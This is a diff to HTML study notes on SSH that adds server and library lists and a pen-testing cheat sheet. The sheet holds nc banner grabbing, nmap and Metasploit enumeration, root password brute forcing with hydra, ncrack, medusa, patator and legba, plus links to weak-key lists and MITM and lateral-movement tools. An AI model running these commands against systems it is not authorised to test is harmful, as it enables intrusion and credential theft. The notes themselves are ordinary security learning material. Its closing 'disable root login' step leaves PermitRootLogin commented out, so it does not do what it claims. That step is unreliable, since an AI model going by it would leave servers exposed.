@@ -26,6 +26,20 @@
             <li>Also allows for tunneling/port forwarding (packets are able to cross networks they would not normally be able to cross)</li>
             <li>Tunneling (port forwarding): wrap packets with additional information (headers), to change their destination</li>
         </ul>
+        <h4>SSH Servers</h4>
+        <ul>
+            <li>openSSH</li>
+            <li>Dropbear</li>
+            <li>PuTTY</li>
+            <li>CopSSH</li>
+        </ul>
+        <h4>SSH Libraries</h4>
+        <ul>
+            <li>libssh</li>
+            <li>wolfSSH</li>
+            <li>Apache MINA SSHD</li>
+            <li>paramiko</li>
+        </ul>
         <hr>
         <h2>Implementation</h2>
         <h3>TCP/IP</h3>
@@ -103,10 +117,78 @@ def ssh_keygen_fingerprint(key):
 
 
         <hr>
-        <h2>Security</h2>
+        <h2>Pen Testing</h2>
+        <h3>Enumeration</h3>
+        <h4>Banner Grabbing</h4>
+        <pre><code class="language-sh">nc -vn $IP 22</code></pre>
+        <h4>Auditing</h4>
+        <p></p>
         <ul>
-            <li>Stealing SSH keys is a popular attack</li>
+            <li><a href="https://www.ssh-audit.com/hardening_guides.html" target="_blank">SSH Hardening Guides</a></li>
+            <li><a href="https://github.com/jtesta/ssh-audit" target="_blank">ssh-audit</a>: automated auditing of ssh server and client configurations</li>
         </ul>
+        <h4>Public SSH key of server</h4>
+        <pre><code class="language-sh">ssh-keyscan -t rsa $IP -p $PORT</code></pre>
+        <h4>Nmap</h4>
+        <pre><code class="language-sh">nmap -p22 $IP -sC # Send default nmap scripts for SSH
+nmap -p22 $IP -sV # Retrieve version
+nmap -p22 $IP --script ssh2-enum-algos # Retrieve supported algorythms 
+nmap -p22 $IP --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
+nmap -p22 $IP --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods</code></pre>
+        <h3>Brute Forcing</h3>
+        <h4>Username Enumeration</h4>
+        <pre><code class="language-sh"># some OpenSSH modules allow for user enumeration using timing attacks
+msf> use scanner/ssh/ssh_enumusers</code></pre>
+        <h4>Passwords</h4>
+        <p>Common ssh credentials: 
+            <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt" target="_blank">[1]</a>
+            <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt" target="_blank">[2]</a>
+        </p>
+        <pre><code class="language-sh">hydra -l root -P passwords.txt [-t 32] $IP ssh
+ncrack -p 22 --user root -P passwords.txt $IP [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h $IP -M ssh
+patator ssh_login host=$IP port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
+legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22</code></pre>
+        <h4>Private Keys</h4>
+        <p>Known bad keys: 
+            <a href="https://github.com/rapid7/ssh-badkeys/tree/master/authorized" target="_blank">[1]</a>
+        </p>
+        <p>Weak SSH keys
+            <a href="https://github.com/snowdroppe/ssh-keybrute" target="_blank">ssh-keybrute</a>,
+            <a href="https://github.com/g0tmi1k/debian-ssh" target="_blank">debian-ssh</a>
+        </p>
+        <pre><code class="language-sh"># nmap script 
+https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
+# msf module
+msf> use scanner/ssh/ssh_identify_pubkeys</code></pre>
+        <h4>Kerberos</h4>
+        <pre><code class="language-sh">crackmapexec ssh --kerberos</code></pre>
+        <h3>Attacks</h3>
+        <ul>
+            <li><a href="https://github.com/jtesta/ssh-mitm", target="_blank">SSH MITM</a>: Steal client credentials (requires ARP spoof or DNS spoof MITM)</li>
+            <li><a href="https://github.com/MegaManSec/SSH-Snake" target="_blank">SSH Snake</a>: Traverse a network using discovered SSH keys on a system</li>
+        </ul>
+        <h3>Misconfigurations</h3>
+        <h4>Default Credentials</h4>
+        <p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#default-credentials" target="_blank">List</a></p>
+        <h4>Config Files</h4>
+        <pre><code class="language-sh">ssh_config
+sshd_config
+authorized_keys
+ssh_known_hosts
+known_hosts
+id_rsa</code></pre>
+        <h4>Disabling root login</h4>
+        <pre><code># Disabling root login is a critical step in securing a server
+sudoedit /etc/ssh/sshd_config       # edit configs
+# Change #PermitRootLogin yes -> #PermitRootLogin no 
+sudo systemctl daemon-reload        # reload configs
+sudo systemctl restart sshd         # restart ssh server
+        </code></pre>
+        
+        
 
 
         <!-- https://www.rfc-editor.org/rfc/rfc4253#section-7.1 -->
